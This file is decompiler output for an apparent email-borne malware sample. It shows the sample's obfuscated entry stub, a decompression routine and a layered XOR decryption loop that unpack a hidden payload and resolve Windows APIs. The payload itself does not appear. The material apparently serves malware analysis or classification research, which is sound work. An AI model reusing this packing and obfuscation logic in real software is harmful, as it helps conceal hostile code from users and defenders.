/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0876/ia32_pe/subject.exe'
 */

stack space not deallocated on return
/*	Procedure: 0x004160C6 - 0x00416185
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    goto L004160d1;
    al = al & 86;
    asm("das");
    al = al - 55;
    (save)esi;
    asm("das");
    *(edx - 112) = *(edx - 112) & edx;
    ecx = -100000;
    asm("loop 0x4160e9");
    asm("pusha");
    eax = L004160fa();
    (restore)ebp;
    goto L00416106;
    al = al & 86;
    asm("das");
    al = al - 55;
    (save)esi;
    asm("das");
    *(edx - 127) = *(edx - 127) & edx;
L00416106:
    asm("in eax,dx");
    esi = -1879048192;
    esi = *(ebp + 24) + 77286;
    asm("cld");
L00416120:
    asm("lodsd");
    if(eax != 0) {
        (save)eax;
        goto L00416149;
        asm("adc [eax],dl");
        asm("adc [eax],dl");
        asm("adc [eax],dl");
        asm("adc [eax],dl");
        asm("adc [eax],dl");
        asm("adc [eax],dl");
        asm("adc [eax],dl");
        asm("adc [eax],dl");
        asm("adc [eax],dl");
        asm("adc [eax],dl");
        asm("adc [ebx+0x3c8dadc8],cl");
L00416149:
        edx = edx + *(esi + 87);
        edi = esi;
        L00416290();
        (restore)edi;
        (restore)esi;
        L00416186();
        (restore)eax;
        esi = esi + eax;
        goto L00416120;
    }
    eax = *(ebx + 52712)();
    asm("popa");
    (save)4199026;
}

/* DEST BLOCK NOT FOUND: 004161cd -> 0041621c */
/*	Procedure: 0x00416186 - 0x004161FF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00416186()
{



    asm("pusha");
    dl = 128;
    ebx = 0;
L0041618b:
    *edi = *esi;
    edi = edi + 1;
    bl = 2;
L0041618e:
    L00416200();
    if(esi = esi + 1) {
        goto L0041618b;
    }
    ecx = 0;
    L00416200();
    >= ? L004161ba : ;
    eax = 0;
    eax = L00416200();
    >= ? L004161ca : ;
    bl = 2;
    al = 16;
L004161ac:
    eax = L00416200();
    asm("adc al,al");
    if(ecx = ecx + 1) {
        goto L004161ac;
    }
    != ? 0x4161f6 : ;
    *edi = al;
    edi = edi + 1;
    goto L0041618e;
    eax = L0041620C();
    if(!(ecx = ecx - ebx)) {
        L0041620A();
        goto L004161f2;
        al = *esi;
        eax = eax >> 1;
        if(esi = esi + 1) {
            goto L0041621c;
        }
        asm("adc ecx,ecx");
    } else {
        asm("xchg eax,ecx");
        eax = eax - 1 << 8;
        al = *esi;
        esi = esi + 1;
        eax = L0041620A();
        if(eax < 32000) {
            if(ah >= 5) {
                goto L004161f0;
            }
            if(eax > 127) {
                goto L004161f1;
            }
        }
    }
    ecx = ecx + 1;
L004161f0:
    ecx = ecx + 1;
L004161f1:
    asm("xchg eax,ebp");
L004161f2:
    eax = ebp;
    bl = 1;
    (save)esi;
    esi = edi - eax;
    asm("rep movsb");
    (restore)esi;
    goto L0041618e;
}

/* DEST BLOCK NOT FOUND: 00416202 -> 00416209 */
/*	Procedure: 0x00416200 - 0x00416209
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00416200()
{



    if(!(dl = dl + dl)) {
        dl = *esi;
        esi = esi + 1;
        asm("adc dl,dl");
    }
}

/*	Procedure: 0x0041620A - 0x0041620B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0041620A()
{



    ecx = 0;
}

/*	Procedure: 0x0041620C - 0x00416225
 *	Argument size: 16
 *	Local size: 0
 *	Save regs size: 0
 */

L0041620C(A1c, A28)
/* unknown */ void  A1c;
/* unknown */ void  A28;
{



    do {
        L00416200();
        asm("adc ecx,ecx");
        eax = L00416200();
    } while(ecx = ecx + 1);
    return;
    A1c = edi - A28;
    asm("popa");
}

/* DEST BLOCK NOT FOUND: 0041623d -> 00416284 */
/*	Procedure: 0x00416226 - 0x00416263
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L00416226(A4, A8, Ac)
/* unknown */ void  A4;
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    (save)ebx;
    (save)esi;
    (save)edi;
    esi = A4;
    edi = A8;
    ebx = Ac;
    asm("cld");
    edx = 0;
    ebx = ebx + edi;
    *edi = *esi;
    edi = edi + 1;
    esi = esi + 1;
L0041623d:
    if(edi >= ebx) {
        goto L00416284;
    }
    L00416264();
    >= ? L0041623a : ;
    L00416272();
    asm("xchg eax,ecx");
    ecx = ecx + 1 + 1;
    eax = L00416272() - 1 - 1 << 8;
    al = *esi;
    esi = esi + 1;
    eax = eax + 1;
    (save)esi;
    esi = edi - eax;
    asm("rep movsb");
    (restore)esi;
    goto L0041623d;
}

/* DEST BLOCK NOT FOUND: 00416267 -> 00416271 */
/*	Procedure: 0x00416264 - 0x00416271
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00416264()
{



    if(!(dx = dx + dx)) {
        asm("xchg eax,edx");
        eax = *esi;
        esi = esi + 4;
        asm("xchg eax,edx");
        edx = dx + dx + 1;
    }
}

stack space not deallocated on return
/*	Procedure: 0x00416272 - 0x0041628F
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L00416272(A14)
/* unknown */ void  A14;
{



    eax = 1;
    L00416264();
    asm("adc eax,eax");
    eax = L00416264();
    < ? L00416275 : ;
    return;
    asm("xchg eax,edi");
    eax = eax - A14;
    (restore)edi;
    (restore)esi;
    (restore)ebx;
}

/* DEST BLOCK NOT FOUND: 00416295 -> 0041623d */
/*	Procedure: 0x00416290 - 0x004165B0
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00416290()
{



    do {
        al = *esi;
L004162e2:
        al = al ^ 108 ^ 168 ^ 75;
L00416323:
        al = al ^ 224 ^ 6 ^ 17;
L00416384:
        al = al ^ 35;
L004163e2:
        al = al ^ 215 ^ 160;
L0041640f:
        al = al ^ 154;
L00416417:
        al = al ^ 7 ^ 190 ^ 46 ^ 93;
L00416428:
        al = al ^ 125;
L00416489:
        al = al ^ 95 ^ 66;
L004164e8:
        al = al ^ 222;
L004165a4:
        *edi = al ^ 175;
        edi = edi + 1;
    } while(ecx = ecx - 1);
    goto L004165b0;
    if(!(esi = esi + 1)) {
        != ? 0x41623d : ;
        al = al ^ 5;
        goto L004162e2;
    }
    goto L00416384;
    al = al ^ 140;
    goto L004162e2;
    al = al ^ 186 ^ 38;
    goto L00416384;
    al = al ^ 236;
    goto L00416323;
    < ? L004162dd : ;
    goto L00416384;
    al = al ^ 185 ^ 1;
    != ? 0x4162ff : ;
    goto L00416384;
    != ? 0x416343 : ;
    al = al ^ 124 ^ 116 ^ 223;
    goto L00416384;
    >= ? 0x4163a1 : ;
    != ? 0x41635e : ;
    goto L00416428;
    != ? 0x4163b3 : ;
    >= ? 0x416353 : ;
    < ? L004163d5 : ;
    al = al ^ 185 ^ 202;
    != ? 0x416417 : ;
    < ? L00416459 : ;
    >= ? 0x416459 : ;
    goto L004163e2;
    >= ? 0x4163ae : ;
    al = al ^ 148;
    goto L0041640f;
    < ? L00416450 : ;
    al = al ^ 254 ^ 48 ^ 137;
    >= ? 0x416495 : ;
    < ? L00416488 : ;
    goto L0041640f;
    al = al ^ 129;
    goto L00416489;
    < ? L00416428 : ;
    al = al ^ 249 ^ 61;
    goto L00416417;
    >= ? 0x41647d : ;
    goto L004164e8;
    != ? 0x41644e : ;
    goto L0041640f;
    al = al ^ 120;
    >= ? 0x416543 : ;
    al = al ^ 144 ^ 119;
    goto L004164e8;
    al = al ^ 107 ^ 199;
    < ? L00416568 : ;
    >= ? 0x4164a6 : ;
    al = al ^ 100;
    >= ? 0x4164c6 : ;
    >= ? 0x4164f9 : ;
    goto L004165a4;
    al = al ^ 215 ^ 167;
    al = al ^ 239 ^ 74 ^ 55;
    goto L004165a4;
    != ? 0x416546 : ;
    != ? 0x416519 : ;
    != ? 0x416543 : ;
    >= ? 0x416529 : ;
    al = al ^ 78;
    >= ? 0x41657e : ;
    al = al ^ 179 ^ 181 ^ 44 ^ 126;
    goto L004165a4;
L004165b0:
}

extern /* addr: 004165B1 */  /*	Procedure: 0x004165B1 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004165B1()
/* address  size  */
/* 0x0041603c       0 */ /* unknown */ void 	__imp__MessageBoxA;
/* 0x00416044       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x00416048       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x0041604c       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x004160c6       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
